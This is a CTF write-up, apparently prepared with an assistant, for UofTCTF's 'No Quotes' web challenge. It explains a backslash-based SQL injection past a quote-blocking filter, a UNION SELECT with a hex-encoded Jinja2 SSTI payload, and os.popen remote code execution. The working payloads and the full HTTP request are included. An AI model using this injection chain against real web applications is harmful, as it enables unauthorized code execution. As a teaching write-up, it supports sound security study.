Here is the updated writeup, now including the crucial **Discovery Step** where you listed the files to find the `readflag` binary.

---

# Writeup: UofTCTF - No Quotes

**Category:** Web Exploitation
**Difficulty:** Medium
**Vulnerabilities:** SQL Injection (WAF Bypass), Server-Side Template Injection (SSTI)

## Challenge Description

We are provided with a web application that allows users to log in. The source code is provided, revealing a "WAF" (Web Application Firewall) that explicitly blocks single (`'`) and double (`"`) quotes. The goal is to bypass this restriction to access the system and retrieve the flag.

## 1. Source Code Analysis

Upon reviewing `app.py`, two critical vulnerabilities were identified.

### The WAF and SQL Injection

The application attempts to prevent SQL injection by blocking quotes:

```python
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)

```

However, the SQL query is constructed using a Python f-string:

```python
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)

```

This manual string concatenation is vulnerable. While we cannot use quotes to break out of the string, we can use a **Backslash (`\`)**. In MySQL/MariaDB, a backslash escapes the character following it.

If we send `username = \`, the query becomes:

```sql
SELECT ... WHERE username = ('\') AND password = ('{password}')

```

The backslash escapes the closing single quote of the username field (`'`). MySQL now treats that quote as a literal character, not a string terminator. The string continues consuming characters until it hits the *next* single quote, which is the one starting the password field.

Effectively, the "username" becomes the string `') AND password = (`. This leaves the `password` input field exposed to inject raw SQL commands.

### Server-Side Template Injection (SSTI)

The `/home` route contains a textbook SSTI vulnerability:

```python
@app.get("/home")
def home():
    if not session.get("user"):
        return redirect(url_for("index"))
    return render_template_string(open("templates/home.html").read() % session["user"])

```

The application takes the `session['user']` value directly from the database and injects it into the HTML template using string formatting (`%`). This allows us to inject Jinja2 template syntax (e.g., `{{ ... }}`) to execute Python code on the server.

## 2. Exploitation Steps

### Step 1: WAF Bypass Strategy

Since the WAF blocks quotes (`'os'`, `'/readflag'`), we cannot send the payload directly. However, MySQL allows us to supply strings as Hexadecimal numbers. We will hex-encode our Jinja2 payloads to bypass the filter.

### Step 2: Reconnaissance (Finding the Flag)

Initially, we attempted to read `/flag` directly, but this resulted in a `500 Internal Server Error`, indicating the file did not exist at that path. We needed to achieve RCE to list the directory contents and find the correct filename.

**Payload to List Files:**

```python
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').listdir('/') }}

```

We converted this payload to Hex and injected it via the login form:

* **Username:** `\`
* **Password:** `) UNION SELECT 1, 0x[HEX_PAYLOAD] #`

Upon visiting `/home` with the exploited session, the server returned the file list:

```text
Welcome, ['bin', 'boot', 'dev', 'etc', 'home', 'lib', 'media', 'mnt', 'opt', 'proc', 'root', 'run', 'sbin', 'srv', 'sys', 'tmp', 'usr', 'var', 'app', 'readflag']

```

This revealed the target binary was named **`readflag`**, not `flag`.

### Step 3: Final Execution

Now that we knew the binary name, we crafted the final payload to execute it using `os.popen`.

**Final Target Payload:**

```python
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('/readflag').read() }}

```

**Request (HTTP POST):**

```http
POST /login HTTP/2
Host: [CHALLENGE_URL]
Content-Type: application/x-www-form-urlencoded

username=\&password=%29+UNION+SELECT+1,0x7b7b206765745f666c61736865645f6d657373616765732e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e28272f72656164666c616727292e726561642829207d7d+%23

```

1. **Login:** The server accepts the credentials and creates a session where `session['user']` is our malicious payload.
2. **Redirect:** We take the session cookie provided by the login response.
3. **Trigger:** We visit `/home`. The `render_template_string` function processes our payload, executes `/readflag`, and prints the output to the screen.

**Flag:**
`uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}`

![Uploading Screenshot 2026-01-11 192547.png…]()

